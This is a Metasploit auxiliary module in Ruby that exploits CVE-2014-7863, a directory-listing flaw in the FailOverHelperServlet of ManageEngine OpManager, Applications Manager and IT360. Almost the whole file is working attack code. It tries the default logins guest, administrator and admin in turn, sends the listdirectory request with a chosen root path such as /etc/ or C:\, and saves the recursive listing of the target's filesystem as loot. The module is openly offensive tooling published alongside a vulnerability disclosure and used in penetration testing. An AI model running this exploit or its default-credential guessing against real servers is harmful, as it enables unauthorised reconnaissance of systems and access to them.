##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "ManageEngine Multiple Products Arbitrary Directory Listing",
      'Description'    => %q{
        This module exploits a directory listing information disclosure vulnerability in the
        FailOverHelperServlet on ManageEngine OpManager, Applications Manager and IT360. It
        makes a recursive listing, so it will list the whole drive if you ask it to list / in
        Linux or C:\ in Windows. This vulnerability is unauthenticated on OpManager and
        Applications Manager, but authenticated in IT360. This module will attempt to login
        using the default credentials for the administrator and guest accounts; alternatively
        you can provide a pre-authenticated cookie or a username / password combo. For IT360
        targets enter the RPORT of the OpManager instance (usually 8300). This module has been
        tested on both Windows and Linux with several different versions Windows paths have to
        be escaped with 4 backslashes on the command line. There is a companion module that
        allows you to download an arbitrary file. This vulnerability has been fixed in Applications
        Manager v11.9 b11912 and OpManager 11.6.
      },
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2014-7863'],
          ['OSVDB', 'TODO'],
          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_failservlet.txt'],
          ['URL', 'FULLDISC_URL']
        ],
      'DisclosureDate' => 'Jan 28 2015'))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, "The base path to OpManager, AppManager or IT360", '/']),
        OptString.new('DIRECTORY', [true, 'Path of the directory to list', '/etc/']),
        OptString.new('IAMAGENTTICKET', [false, 'Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)']),
        OptString.new('USERNAME', [true, 'The username to login as (IT360 target only)', 'guest']),
        OptString.new('PASSWORD', [true, 'Password for the specified username (IT360 target only)', 'guest']),
        OptString.new('DOMAIN_NAME', [false, 'Name of the domain to logon to (IT360 target only)'])
      ], self.class)
  end


  def get_cookie
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'])
    })

    if res
      return res.get_cookies
    end
  end

  def detect_it360
    res = send_request_cgi({
      'uri'    => '/',
      'method' => 'GET'
    })

    if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})/
      return true
    end

    return false
  end

  def get_it360_cookie_name
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/')
    })

    cookie = res.get_cookies

    if cookie =~ /IAMAGENTTICKET([A-Z]{0,4})/
      return $1
    else
      return nil
    end
  end

  def authenticate_it360(port, path, username, password)
    if datastore['DOMAIN_NAME'].nil?
      vars_post = {
        'LOGIN_ID' => username,
        'PASSWORD' => password,
        'isADEnabled' => 'false'
      }
    else
      vars_post = {
        'LOGIN_ID' => username,
        'PASSWORD' => password,
        'isADEnabled' => 'true',
        'domainName' => datastore['DOMAIN_NAME']
      }
    end

    op_port = datastore['RPORT']
    datastore['RPORT'] = port

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(path),
      'vars_get' => {
        'service' => "OpManager",
        'furl' => "/",
        'timestamp' => Time.now.to_i
      },
      'vars_post' => vars_post
    })

    datastore['RPORT'] = op_port

    if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/
      # /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/ -> this pattern is to avoid matching "removed"
      return res.get_cookies
    else
      return nil
    end
  end


  def login_it360
    # Do we already have a valid cookie? If yes, just return that.
    unless datastore['IAMAGENTTICKET'].nil?
      cookie_name = get_it360_cookie_name
      cookie = 'IAMAGENTTICKET' + cookie_name + '=' + datastore['IAMAGENTTICKET'] + ';'
      return cookie
    end

    # get the correct path, host and port
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/')
    })

    if res && res.redirect?
      uri = [ res.redirection.port, res.redirection.path ]
    else
      return nil
    end

    cookie = authenticate_it360(uri[0], uri[1], datastore['USERNAME'], datastore['PASSWORD'])
    if cookie != nil
      return cookie
    elsif datastore['USERNAME'] == 'guest' && datastore['JSESSIONID'] == nil
      # we've tried with the default guest password, now let's try with the default admin password
      cookie = authenticate_it360(uri[0], uri[1], 'administrator', 'administrator')
      if cookie != nil
        return cookie
      else
        # Try one more time with the default admin login for some versions
        cookie = authenticate_it360(uri[0], uri[1], 'admin', 'admin')
        if cookie != nil
          return cookie
        end
      end
    end
    return nil
  end

  def run
    # No point to continue if directory is not specified
    if datastore['DIRECTORY'].empty?
      print_error('Please supply the path of the directory you want to list.')
      return
    end

    if detect_it360
      print_status("#{peer} - Detected IT360, attempting to login...")
      cookie = login_it360
      if cookie == nil
        print_error("#{peer} - Failed to login to IT360!")
        return
      end
    else
      cookie = get_cookie
    end

    servlet = 'com.adventnet.me.opmanager.servlet.FailOverHelperServlet'
    res = send_request_cgi({
      'method' => 'GET',
      'cookie' => cookie,
      'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', servlet),
    })
    if res && res.code == 404
      servlet = 'FailOverHelperServlet'
    end

    # Create request
    begin
      print_status("#{peer} - Listing directory #{datastore['DIRECTORY']}")
      res = send_request_cgi({
        'method' => 'POST',
        'cookie' => cookie,
        'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', servlet),
        'vars_get' => {
          'operation' => 'listdirectory',
          'rootDirectory' => datastore['DIRECTORY']
        },
      })
    rescue Rex::ConnectionRefused
      print_error("#{peer} - Could not connect.")
      return
    end

    # Show data if needed
    if res && res.code == 200
      vprint_line(res.body.to_s)
      fname = File.basename(datastore['DIRECTORY'])

      path = store_loot(
        'manageengine.http',
        'text/plain',
        datastore['RHOST'],
        res.body,
        fname
      )
      print_good("File with directory listing saved in: #{path}")
    else
      print_error("#{peer} - Failed to list directory.")
    end
  end
end
